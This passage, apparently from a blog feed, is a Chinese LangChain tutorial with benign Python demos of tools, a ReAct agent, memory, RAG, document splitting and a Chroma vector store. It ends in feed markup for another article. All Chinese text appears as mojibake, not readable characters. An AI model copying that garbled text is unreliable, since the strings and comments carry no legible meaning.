</ul>
<pre><code class="hljs language-py" lang="py"><span class="hljs-string">"""
å·¥å…·æ¨¡å—åŒ…
åŒ…å«æ•°å­¦å·¥å…·å’Œæ—¶é—´å·¥å…·
"""</span>

<span class="hljs-keyword">from</span> .math_tools <span class="hljs-keyword">import</span> add
<span class="hljs-keyword">from</span> .time_tools <span class="hljs-keyword">import</span> get_current_time

__all__ = [
    <span class="hljs-string">"add"</span>,
    <span class="hljs-string">"get_current_time"</span>,
]

</code></pre>
<pre><code class="hljs language-py" lang="py"><span class="hljs-string">"""
æ•°å­¦å·¥å…·æ¨¡å—
ç”¨äºæ‰§è¡Œæ•°å­¦è¿ç®—
"""</span>

<span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool


<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a: <span class="hljs-built_in">int</span>, b: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-string">"""
    è®¡ç®—ä¸¤ä¸ªæ•´æ•°çš„å’Œã€‚
    Agent ä¼šåœ¨éœ€è¦è¿›è¡ŒåŠ æ³•è¿ç®—æ—¶è‡ªåŠ¨è°ƒç”¨æ­¤å·¥å…·ã€‚

    Args:
        a: ç¬¬ä¸€ä¸ªæ•´æ•°
        b: ç¬¬äºŒä¸ªæ•´æ•°

    Returns:
        ä¸¤ä¸ªæ•´æ•°çš„å’Œ
    """</span>
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å¤„ç†å­—ç¬¦ä¸²ç±»å‹çš„è¾“å…¥ï¼ˆAgent å¯èƒ½ä¼ é€’å­—ç¬¦ä¸²æ ¼å¼çš„æ•°å­—ï¼‰</span>
        a = <span class="hljs-built_in">int</span>(a) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(a, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">else</span> a
        b = <span class="hljs-built_in">int</span>(b) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(b, <span class="hljs-built_in">str</span>) <span class="hljs-keyword">else</span> b
        <span class="hljs-keyword">return</span> a + b
    <span class="hljs-keyword">except</span> (ValueError, TypeError) <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"è®¡ç®—æ—¶å‘ç”Ÿé”™è¯¯: æ— æ³•å°†è¾“å…¥è½¬æ¢ä¸ºæ•´æ•° - <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-keyword">return</span> <span class="hljs-string">f"è®¡ç®—æ—¶å‘ç”Ÿé”™è¯¯: <span class="hljs-subst">{<span class="hljs-built_in">str</span>(e)}</span>"</span>
</code></pre>
<pre><code class="hljs language-py" lang="py"><span class="hljs-string">"""
æ—¶é—´å·¥å…·æ¨¡å—
ç”¨äºè·å–å½“å‰æ—¥æœŸå’Œæ—¶é—´
"""</span>

<span class="hljs-keyword">from</span> datetime <span class="hljs-keyword">import</span> datetime
<span class="hljs-keyword">from</span> langchain.tools <span class="hljs-keyword">import</span> tool


<span class="hljs-meta">@tool</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_current_time</span>() -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-string">"""
    è·å–å½“å‰æ—¶é—´ã€‚
    Agent ä¼šåœ¨éœ€è¦è·å–å½“å‰æ—¶é—´æ—¶è‡ªåŠ¨è°ƒç”¨æ­¤å·¥å…·ã€‚

    Returns:
        å½“å‰æ—¶é—´ï¼ˆæ ¼å¼ä¸º HH:MM:SSï¼‰
    """</span>
    <span class="hljs-keyword">return</span> datetime.now().strftime(<span class="hljs-string">"%H:%M:%S"</span>)

</code></pre>
<h3 data-id="heading-4">3ã€Agents</h3>
<p>ç”¨äºåˆå§‹åŒ–<code>Agent</code>ï¼Œå¹¶å°è£…äº†<strong>å¾ªç¯ç®¡ç†</strong>ã€<strong>å·¥å…·è°ƒç”¨</strong>ã€ <strong>çŸ­æœŸè®°å¿†</strong>ã€<strong>é”™è¯¯å¤„ç†</strong>ã€<strong>è¿­ä»£æ§åˆ¶</strong>ã€<strong>æ—¥å¿—è¾“å‡º</strong>ç­‰ç›¸å…³é€»è¾‘ï¼Œä¸å†éœ€è¦æ‰‹å†™ï¼š</p>
<ul>
<li><strong>åˆå§‹åŒ–<code>Agent</code></strong>ï¼šæ„å»ºä¸€ä¸ªé‡‡ç”¨<code>ReAct</code>æ¨¡å¼çš„<code>Agent</code>,ç”±<code>LLM</code>é©±åŠ¨ï¼Œé…å¤‡å·¥å…·åˆ—è¡¨å’Œæç¤ºè¯</li>
<li><strong>å¾ªç¯ç®¡ç†</strong>ï¼šæ‰§è¡Œ<code>Agent</code>å¾ªç¯é€»è¾‘ï¼Œè‡ªåŠ¨ç®¡ç†<code>ReAct</code>å¾ªç¯</li>
<li><strong>å·¥å…·è°ƒç”¨</strong>ï¼šæ ¹æ®<code>Agent</code>å†³ç­–è°ƒç”¨å·¥å…·å¹¶è·å–ç»“æœ</li>
<li><strong>çŸ­æœŸè®°å¿†</strong>ï¼šå°è£…<code>memory</code>æ¨¡å—ï¼Œç”¨äºè®°å¿†å¤šè½®å¯¹è¯</li>
<li><strong>é”™è¯¯å¤„ç†</strong>ï¼šå¤„ç†è§£æé”™è¯¯å’Œå·¥å…·æ‰§è¡Œå¼‚å¸¸</li>
<li><strong>è¿­ä»£æ§åˆ¶</strong>ï¼šé™åˆ¶æœ€å¤§è¿­ä»£æ¬¡æ•°ï¼Œé˜²æ­¢æ— é™å¾ªç¯</li>
<li><strong>æ—¥å¿—è¾“å‡º</strong>ï¼š<code>verbose=True</code>æ—¶ï¼Œæ˜¾ç¤ºè¯¦ç»†æ‰§è¡Œè¿‡ç¨‹</li>
</ul>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_agent_executor</span>(<span class="hljs-params">llm, tools, memory</span>):  <span class="hljs-comment"># åˆ›å»ºAgentæ‰§è¡Œå™¨</span>
    prompt_template = <span class="hljs-string">"""ä½ æ˜¯ä¸€ä¸ªå‹å¥½çš„ AI åŠ©æ‰‹ã€‚ä½ å¯ä»¥ä½¿ç”¨å·¥å…·æ¥å›ç­”é—®é¢˜ã€‚
    ä½ å¯ä»¥ä½¿ç”¨çš„å·¥å…·ï¼š
    {tools}

    ä½¿ç”¨ä»¥ä¸‹æ ¼å¼ï¼š
    Question: éœ€è¦å›ç­”çš„é—®é¢˜
    Thought: ä½ åº”è¯¥æ€è€ƒè¦åšä»€ä¹ˆ
    Action: è¦é‡‡å–çš„è¡ŒåŠ¨ï¼Œåº”è¯¥æ˜¯ [{tool_names}] ä¸­çš„ä¸€ä¸ª
    Action Input: è¡ŒåŠ¨çš„è¾“å…¥
    Observation: è¡ŒåŠ¨çš„ç»“æœ
    ... (è¿™ä¸ª Thought/Action/Action Input/Observation å¯ä»¥é‡å¤ N æ¬¡)
    Thought: æˆ‘ç°åœ¨çŸ¥é“æœ€ç»ˆç­”æ¡ˆäº†
    Final Answer: å¯¹åŸå§‹é—®é¢˜çš„æœ€ç»ˆç­”æ¡ˆ

    {chat_history}

    Question: {input}
    Thought: {agent_scratchpad}"""</span>
    prompt = PromptTemplate.from_template(prompt_template)  <span class="hljs-comment"># åˆ›å»ºæç¤ºæ¨¡æ¿</span>

    agent = create_react_agent(llm=llm, tools=tools, prompt=prompt)  <span class="hljs-comment"># åˆ›å»ºAgent</span>

    agent_executor = AgentExecutor(
        agent=agent,  <span class="hljs-comment"># Agentå®ä¾‹</span>
        tools=tools,  <span class="hljs-comment"># å·¥å…·åˆ—è¡¨</span>
        memory=memory,  <span class="hljs-comment"># è®°å¿†æ¨¡å—</span>
        verbose=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># æ˜¯å¦æ‰“å°è¯¦ç»†ä¿¡æ¯</span>
        handle_parsing_errors=<span class="hljs-literal">True</span>,  <span class="hljs-comment"># å¤„ç†è§£æé”™è¯¯</span>
        max_iterations=<span class="hljs-number">5</span>,  <span class="hljs-comment"># æœ€å¤§è¿­ä»£æ¬¡æ•°</span>
    )
    <span class="hljs-keyword">return</span> agent_executor
</code></pre>
<h3 data-id="heading-5">4ã€Memory</h3>
<p>ç”¨äºè®°å¿†å¤šè½®å¯¹è¯ï¼Œä½¿<code>Agent</code>å¯ä»¥æ›´è‡ªç„¶ã€æ›´æ™ºèƒ½çš„å¤šè½®å¯¹è¯ï¼Œè€Œä¸æ˜¯å•æ¬¡é—®ç­”ï¼š</p>
<ul>
<li><strong>ä¸Šä¸‹æ–‡è¿è´¯</strong>ï¼š<code>Agent</code>èƒ½ç†è§£å¤šè½®å¯¹è¯çš„ä¸Šä¸‹æ–‡</li>
<li><strong>ä¿¡æ¯æŒä¹…åŒ–</strong>ï¼šåœ¨å•æ¬¡ä¼šè¯ä¸­è®°ä½ç”¨æˆ·æä¾›çš„ä¿¡æ¯</li>
<li><strong>æ™ºèƒ½å¯¹è¯</strong>ï¼šæ”¯æŒéœ€è¦å¤šè½®äº¤äº’çš„å¤æ‚ä»»åŠ¡</li>
<li><strong>è‡ªåŠ¨ç®¡ç†</strong>ï¼šæ— éœ€æ‰‹åŠ¨ç»´æŠ¤å¯¹è¯å†å²åˆ—è¡¨</li>
</ul>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_memory</span>():  <span class="hljs-comment"># åˆ›å»ºè®°å¿†æ¨¡å—</span>
    memory = ConversationBufferMemory(
        memory_key=<span class="hljs-string">"chat_history"</span>,  <span class="hljs-comment"># åœ¨ prompt ä¸­ä½¿ç”¨çš„å˜é‡å</span>
        return_messages=<span class="hljs-literal">False</span>,  <span class="hljs-comment"># è¿”å›å­—ç¬¦ä¸²æ ¼å¼ï¼Œé€‚åˆå­—ç¬¦ä¸²æ¨¡æ¿</span>
    )
    <span class="hljs-keyword">return</span> memory

</code></pre>
<h3 data-id="heading-6">5ã€Retrieval</h3>
<p>å®ç°<code>RAG</code>(æ£€ç´¢å¢å¼ºç”Ÿæˆ)ï¼Œè®©<code>Agent</code>å…·å¤‡æŸ¥é˜…æ–‡æ¡£çš„èƒ½åŠ›ï¼Œå¯ä»¥åŸºäºå®é™…çš„æ–‡æ¡£å†…å®¹å›ç­”é—®é¢˜ï¼Œä½¿<code>AI</code>åº”ç”¨ä»"çŒœç­”æ¡ˆ"å˜ä¸º"æŸ¥èµ„æ–™+å›ç­”"ï¼š</p>
<ul>
<li><strong>æ£€ç´¢</strong>ï¼šä»çŸ¥è¯†åº“ä¸­æ‰¾åˆ°ä¸ç”¨æˆ·æŸ¥è¯¢æœ€ç›¸å…³çš„æ–‡æ¡£ç‰‡æ®µ</li>
<li><strong>å¢å¼º</strong>ï¼šå°†æ£€ç´¢ç»“æœä¸æŸ¥è¯¢ç»“åˆï¼Œæ„å»ºå¢å¼ºæç¤º</li>
<li><strong>ç”Ÿæˆ</strong>ï¼š<code>LLM</code>åŸºäºå¢å¼ºæç¤ºç”Ÿæˆå‡†ç¡®å›ç­”</li>
</ul>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_rag_with_vectorstore</span>(<span class="hljs-params">vectorstore</span>):  <span class="hljs-comment"># æ¼”ç¤ºç»“åˆå‘é‡å­˜å‚¨çš„ RAG æ¨¡å—</span>
    api_key = os.getenv(<span class="hljs-string">"DASHSCOPE_API_KEY"</span>)
    llm = ChatOpenAI(
        model=<span class="hljs-string">"qwen-plus"</span>,
        api_key=api_key,
        base_url=<span class="hljs-string">"https://dashscope.aliyuncs.com/compatible-mode/v1"</span>,
        temperature=<span class="hljs-number">0.7</span>,
    )
    retriever = vectorstore.as_retriever(search_kwargs={<span class="hljs-string">"k"</span>: <span class="hljs-number">2</span>})  <span class="hljs-comment"># åˆ›å»ºæ£€ç´¢å™¨</span>
    <span class="hljs-comment"># è‡ªå®šä¹‰æç¤ºè¯æ¨¡æ¿</span>
    prompt_template = <span class="hljs-string">"""åŸºäºä»¥ä¸‹ä¸Šä¸‹æ–‡ä¿¡æ¯å›ç­”é—®é¢˜ã€‚å¦‚æœä¸Šä¸‹æ–‡ä¸­æ²¡æœ‰ç›¸å…³ä¿¡æ¯ï¼Œè¯·è¯´æ˜æ— æ³•ä»æä¾›çš„æ–‡æ¡£ä¸­æ‰¾åˆ°ç­”æ¡ˆã€‚
        ä¸Šä¸‹æ–‡ï¼š
        {context}
        é—®é¢˜ï¼š{question}
        è¯·ç”¨ä¸­æ–‡å›ç­”ï¼š"""</span>
    PROMPT = PromptTemplate(  <span class="hljs-comment"># åˆ›å»ºæç¤ºè¯æ¨¡æ¿</span>
        template=prompt_template, input_variables=[<span class="hljs-string">"context"</span>, <span class="hljs-string">"question"</span>]
    )

    test_question = <span class="hljs-string">"LangChain æœ‰å“ªäº›æ ¸å¿ƒæ¦‚å¿µï¼Ÿ"</span>
    docs = retriever.get_relevant_documents(test_question)  <span class="hljs-comment"># æ£€ç´¢ç›¸å…³æ–‡æ¡£</span>
    context = <span class="hljs-string">"\n\n"</span>.join([doc.page_content <span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> docs])  <span class="hljs-comment"># æ„å»ºä¸Šä¸‹æ–‡</span>
    prompt = PROMPT.<span class="hljs-built_in">format</span>(context=context, question=test_question)
    response = llm.invoke(prompt)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n  âœ“ ç­”æ¡ˆç”ŸæˆæˆåŠŸï¼š"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  <span class="hljs-subst">{response.content <span class="hljs-keyword">if</span> <span class="hljs-built_in">hasattr</span>(response, <span class="hljs-string">'content'</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">str</span>(response)}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n  å‚è€ƒæ–‡æ¡£æ¥æºï¼š"</span>)
    <span class="hljs-keyword">for</span> i, doc <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(docs, <span class="hljs-number">1</span>):
        source = os.path.basename(doc.metadata.get(<span class="hljs-string">"source"</span>, <span class="hljs-string">"æœªçŸ¥"</span>))
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"    [<span class="hljs-subst">{i}</span>] <span class="hljs-subst">{source}</span>"</span>)
    <span class="hljs-built_in">print</span>()

</code></pre>
<h3 data-id="heading-7">6ã€Document processing</h3>
<p>ä»æ–‡æ¡£ä¸­è‡ªåŠ¨æå–ã€ç†è§£ã€åˆ†ç±»å’Œå¤„ç†ä¿¡æ¯ï¼Œå°†éç»“æ„åŒ–æ–‡æ¡£è½¬æ¢ä¸ºå¯æœç´¢ã€å¯åˆ†æã€å¯é›†æˆçš„ç»“æ„åŒ–æ•°æ®ï¼š</p>
<ul>
<li><strong>æ–‡æ¡£åŠ è½½</strong>ï¼šä»å„ç§æ¥æºåŠ è½½æ–‡æ¡£ï¼ˆ<code>PDF</code>ã€å›¾åƒã€æ‰«æä»¶ï¼‰</li>
<li><strong><code>OCR</code>å¼•æ“</strong>ï¼šè¯†åˆ«æ–‡æ¡£ä¸­çš„å°åˆ·ä½“å’Œæ‰‹å†™æ–‡æœ¬</li>
<li><strong><code>NLP</code>æ¨¡å‹</strong>ï¼šç†è§£æ–‡æ¡£å†…å®¹å¹¶æå–å…³é”®ä¿¡æ¯</li>
<li><strong>åˆ†ç±»</strong>ï¼šè¯†åˆ«æ–‡æ¡£ç±»å‹å¹¶è¿›è¡Œåˆ†ç±»</li>
<li><strong>æ•°æ®è¾“å‡º</strong>ï¼šå°†æå–å‡ºçš„ä¿¡æ¯å¯¼å‡ºåˆ°æ•°æ®åº“ã€ç³»ç»Ÿæˆ–å·¥ä½œæµ</li>
</ul>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_document_processing</span>():  <span class="hljs-comment"># æ¼”ç¤ºæ–‡æ¡£å¤„ç†æ¨¡å—</span>
    <span class="hljs-comment"># åˆ›å»ºç¤ºä¾‹æ–‡æ¡£</span>
    sample_docs = [
        {
            <span class="hljs-string">"filename"</span>: os.path.join(DOCUMENTS_DIR, <span class="hljs-string">"langchain_intro.txt"</span>),
            <span class="hljs-string">"content"</span>: <span class="hljs-string">"""LangChain ç®€ä»‹

            LangChain æ˜¯ä¸€ä¸ªç”¨äºæ„å»º LLM åº”ç”¨çš„æ¡†æ¶ã€‚

            æ ¸å¿ƒæ¦‚å¿µï¼š
            1. Chainsï¼ˆé“¾ï¼‰ï¼šå°†å¤šä¸ªç»„ä»¶è¿æ¥èµ·æ¥
            2. Agentsï¼ˆä»£ç†ï¼‰ï¼šèƒ½å¤Ÿè‡ªä¸»å†³ç­–å’Œæ‰§è¡Œä»»åŠ¡
            3. Memoryï¼ˆè®°å¿†ï¼‰ï¼šç»´æŠ¤å¯¹è¯å†å²
            4. Toolsï¼ˆå·¥å…·ï¼‰ï¼šæ‰©å±• LLM çš„èƒ½åŠ›
            5. Document Processingï¼ˆæ–‡æ¡£å¤„ç†ï¼‰ï¼šåŠ è½½å’Œé¢„å¤„ç†æ–‡æ¡£
            6. Vector Storesï¼ˆå‘é‡å­˜å‚¨ï¼‰ï¼šå­˜å‚¨å’Œæ£€ç´¢æ–‡æ¡£å‘é‡

            ä¸»è¦åŠŸèƒ½ï¼š
            - æ–‡æ¡£åŠ è½½å’Œé¢„å¤„ç†
            - å‘é‡æ•°æ®åº“é›†æˆ
            - æ£€ç´¢å¢å¼ºç”Ÿæˆï¼ˆRAGï¼‰
            - å·¥å…·è°ƒç”¨å’Œ Agent æ„å»º

            ä½¿ç”¨åœºæ™¯ï¼š
            - æ„å»ºæ™ºèƒ½é—®ç­”ç³»ç»Ÿ
            - æ–‡æ¡£æ£€ç´¢å’Œåˆ†æ
            - è‡ªåŠ¨åŒ–ä»»åŠ¡å¤„ç†
            - çŸ¥è¯†åº“æ„å»º
            """</span>,
        },
        {
            <span class="hljs-string">"filename"</span>: os.path.join(DOCUMENTS_DIR, <span class="hljs-string">"python_basics.txt"</span>),
            <span class="hljs-string">"content"</span>: <span class="hljs-string">"""Python åŸºç¡€è¯­æ³•

            Python æ˜¯ä¸€ç§é«˜çº§ç¼–ç¨‹è¯­è¨€ï¼Œå…·æœ‰ç®€æ´æ˜äº†çš„è¯­æ³•ã€‚

            å˜é‡å’Œæ•°æ®ç±»å‹ï¼š
            - æ•´æ•°ï¼šx = 10
            - æµ®ç‚¹æ•°ï¼šy = 3.14
            - å­—ç¬¦ä¸²ï¼šname = "Python"
            - åˆ—è¡¨ï¼šnumbers = [1, 2, 3]

            æ§åˆ¶æµï¼š
            - if/else è¯­å¥ç”¨äºæ¡ä»¶åˆ¤æ–­
            - for å¾ªç¯ç”¨äºéå†åºåˆ—
            - while å¾ªç¯ç”¨äºé‡å¤æ‰§è¡Œ

            å‡½æ•°å®šä¹‰ï¼š
            def greet(name):
                return f"Hello, {name}!"

            Python çš„ç‰¹ç‚¹ï¼š
            - è¯­æ³•ç®€æ´ï¼Œæ˜“äºå­¦ä¹ 
            - ä¸°å¯Œçš„æ ‡å‡†åº“å’Œç¬¬ä¸‰æ–¹åº“
            - è·¨å¹³å°æ”¯æŒ
            - å¹¿æ³›ç”¨äº Web å¼€å‘ã€æ•°æ®ç§‘å­¦ã€äººå·¥æ™ºèƒ½ç­‰é¢†åŸŸ"""</span>,
        },
    ]
    os.makedirs(DOCUMENTS_DIR, exist_ok=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># ç¡®ä¿æ–‡æ¡£ç›®å½•å­˜åœ¨</span>

    documents = []
    <span class="hljs-keyword">for</span> doc_info <span class="hljs-keyword">in</span> sample_docs:
        filepath = doc_info[<span class="hljs-string">"filename"</span>]
        os.makedirs(os.path.dirname(filepath), exist_ok=<span class="hljs-literal">True</span>)
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filepath, <span class="hljs-string">"w"</span>, encoding=<span class="hljs-string">"utf-8"</span>) <span class="hljs-keyword">as</span> f:  <span class="hljs-comment"># å†™å…¥æ–‡æ¡£å†…å®¹</span>
            f.write(doc_info[<span class="hljs-string">"content"</span>])
        loader = TextLoader(filepath, encoding=<span class="hljs-string">"utf-8"</span>)  <span class="hljs-comment"># ä½¿ç”¨ TextLoader åŠ è½½æ–‡æ¡£</span>
        loaded_docs = loader.load()  <span class="hljs-comment"># åŠ è½½æ–‡æ¡£</span>
        documents.extend(loaded_docs)  <span class="hljs-comment"># å°†åŠ è½½çš„æ–‡æ¡£æ·»åŠ åˆ° documents åˆ—è¡¨ä¸­</span>

    <span class="hljs-comment"># åœ¨å¾ªç¯å¤–éƒ¨åˆ›å»ºæ–‡æœ¬åˆ†å‰²å™¨å¹¶åˆ†å‰²æ–‡æ¡£</span>
    text_splitter = (
        RecursiveCharacterTextSplitter(  <span class="hljs-comment"># ä½¿ç”¨ RecursiveCharacterTextSplitter åˆ†å‰²æ–‡æ¡£</span>
            chunk_size=<span class="hljs-number">200</span>,  <span class="hljs-comment"># æ¯ä¸ªç‰‡æ®µçš„æœ€å¤§å­—ç¬¦æ•°</span>
            chunk_overlap=<span class="hljs-number">50</span>,  <span class="hljs-comment"># ç‰‡æ®µä¹‹é—´çš„é‡å å­—ç¬¦æ•°</span>
            length_function=<span class="hljs-built_in">len</span>,
        )
    )
    splits = text_splitter.split_documents(documents)  <span class="hljs-comment"># åˆ†å‰²æ–‡æ¡£</span>

    <span class="hljs-keyword">return</span> splits  <span class="hljs-comment"># è¿”å›åˆ†å‰²åçš„æ–‡æ¡£ç‰‡æ®µ</span>
</code></pre>
<h3 data-id="heading-8">7ã€Vector Stores</h3>
<p>ç”¨äºè¿æ¥è¯­è¨€æ¨¡å‹ä¸å®é™…åº”ç”¨æ•°æ®çš„å…³é”®æ¡¥æ¢ï¼Œå­˜å‚¨å’Œæ£€ç´¢æ–‡æœ¬çš„åµŒå…¥å‘é‡ï¼Œä¸ºå®ç°è¯­ä¹‰æœç´¢å’Œ<code>RAG</code>ï¼ˆæ£€ç´¢å¢å¼ºç”Ÿæˆï¼‰ç³»ç»Ÿæä¾›åŸºç¡€æ”¯æŒï¼š</p>
<ul>
<li><strong>å­˜å‚¨åµŒå…¥å‘é‡</strong>ï¼šå°†éç»“æ„æ–‡æœ¬è½¬æ¢ä¸ºæ•°å€¼å‘é‡å¹¶å­˜å‚¨</li>
<li><strong>é«˜æ•ˆè¯­ä¹‰æœç´¢</strong>ï¼šåŸºäºå‘é‡ç›¸ä¼¼åº¦è€Œéå…³é”®è¯åŒ¹é…è¿›è¡Œæœç´¢</li>
<li><strong>ä¸º<code>RAG</code>æä¾›æ£€ç´¢èƒ½åŠ›</strong>ï¼šé€šè¿‡<code>vectorstore.as_retriever()</code>æ–¹æ³•å°†å‘é‡å­˜å‚¨è½¬æ¢ä¸ºæ£€ç´¢å™¨</li>
<li><strong>æä¾›ç»Ÿä¸€<code>API</code>æ¥å£</strong>ï¼šè½»æ¾åˆ‡æ¢ä¸åŒçš„å‘é‡æ•°æ®åº“ï¼ˆ<code>FAISS</code>ã€<code>Chroma</code>ã€<code>Pinecone</code>ï¼‰</li>
</ul>
<pre><code class="hljs language-py" lang="py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">demo_vector_stores</span>(<span class="hljs-params">splits, embeddings</span>):  <span class="hljs-comment"># æ¼”ç¤ºå‘é‡å­˜å‚¨æ¨¡å—</span>
    vectorstore = Chroma.from_documents(  <span class="hljs-comment"># åˆ›å»ºå‘é‡æ•°æ®åº“</span>
        documents=splits,
        embedding=embeddings,
        persist_directory=CHROMA_DB_DIR,  <span class="hljs-comment"># æŒä¹…åŒ–ç›®å½•</span>
    )

    test_queries = [
        <span class="hljs-string">"LangChain æœ‰å“ªäº›æ ¸å¿ƒæ¦‚å¿µï¼Ÿ"</span>,
        <span class="hljs-string">"Python çš„åŸºæœ¬æ•°æ®ç±»å‹æœ‰å“ªäº›ï¼Ÿ"</span>,
        <span class="hljs-string">"æ–‡æ¡£å¤„ç†çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿ"</span>,
    ]
    <span class="hljs-keyword">for</span> query <span class="hljs-keyword">in</span> test_queries:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  æŸ¥è¯¢: <span class="hljs-subst">{query}</span>"</span>)
        results = vectorstore.similarity_search(query, k=<span class="hljs-number">2</span>)  <span class="hljs-comment"># è¿”å›æœ€ç›¸ä¼¼çš„2ä¸ªç‰‡æ®µ</span>
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"  âœ“ æ£€ç´¢åˆ° <span class="hljs-subst">{<span class="hljs-built_in">len</span>(results)}</span> ä¸ªç›¸å…³ç‰‡æ®µï¼š"</span>)
        <span class="hljs-keyword">for</span> i, doc <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(results, <span class="hljs-number">1</span>):
            source = os.path.basename(doc.metadata.get(<span class="hljs-string">"source"</span>, <span class="hljs-string">"æœªçŸ¥"</span>))
            content_preview = doc.page_content[:<span class="hljs-number">80</span>].replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">" "</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"    [<span class="hljs-subst">{i}</span>] æ¥æº: <span class="hljs-subst">{source}</span>"</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"        å†…å®¹: <span class="hljs-subst">{content_preview}</span>..."</span>)
        <span class="hljs-built_in">print</span>()

    query = <span class="hljs-string">"LangChain çš„æ ¸å¿ƒåŠŸèƒ½"</span>
    results_with_scores = vectorstore.similarity_search_with_score(
        query, k=<span class="hljs-number">2</span>
    )  <span class="hljs-comment"># è¿”å›æœ€ç›¸ä¼¼çš„2ä¸ªç‰‡æ®µåŠå…¶ç›¸ä¼¼åº¦åˆ†æ•°</span>
    <span class="hljs-keyword">for</span> i, (doc, score) <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(results_with_scores, <span class="hljs-number">1</span>):  <span class="hljs-comment"># éå†ç»“æœ</span>
        source = os.path.basename(doc.metadata.get(<span class="hljs-string">"source"</span>, <span class="hljs-string">"æœªçŸ¥"</span>))
        content_preview = doc.page_content[:<span class="hljs-number">80</span>].replace(<span class="hljs-string">"\n"</span>, <span class="hljs-string">" "</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"    [<span class="hljs-subst">{i}</span>] ç›¸ä¼¼åº¦åˆ†æ•°: <span class="hljs-subst">{score:<span class="hljs-number">.4</span>f}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"        æ¥æº: <span class="hljs-subst">{source}</span>"</span>)
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"        å†…å®¹: <span class="hljs-subst">{content_preview}</span>..."</span>)
    <span class="hljs-built_in">print</span>()

    <span class="hljs-keyword">return</span> vectorstore
</code></pre>
<h2 data-id="heading-9">æ€»ç»“</h2>
<p>æœ¬æ–‡ä»‹ç»äº†<code>LangChain</code>çš„7ä¸ªç»„æˆéƒ¨åˆ†ï¼Œå¹¶ä¸”åˆ†åˆ«ä»¥ä¼ªä»£ç çš„å½¢å¼å±•ç¤ºå‡ºç›¸å…³demoï¼Œå¸Œæœ›èƒ½å¯¹ä½ æœ‰æ‰€å¸®åŠ©!!!!</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringBoot 3.xå®æˆ˜ï¼š5ä¸ªé«˜æ•ˆå¼€å‘æŠ€å·§è®©æˆ‘å‡å°‘äº†40%é‡å¤ä»£ç ]]></title>    <link>https://juejin.cn/post/7594358540048908323</link>    <guid>https://juejin.cn/post/7594358540048908323</guid>    <pubDate>2026-01-13T04:18:39.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594358540048908323" data-draft-id="7594396368174235683" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringBoot 3.xå®æˆ˜ï¼š5ä¸ªé«˜æ•ˆå¼€å‘æŠ€å·§è®©æˆ‘å‡å°‘äº†40%é‡å¤ä»£ç "/> <meta itemprop="keywords" content="åç«¯,å‰ç«¯,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-13T04:18:39.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é˜¿æ©™çš„ç™¾å®ç®±"/> <meta itemprop="url" content="https://juejin.cn/user/1638743356481367"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
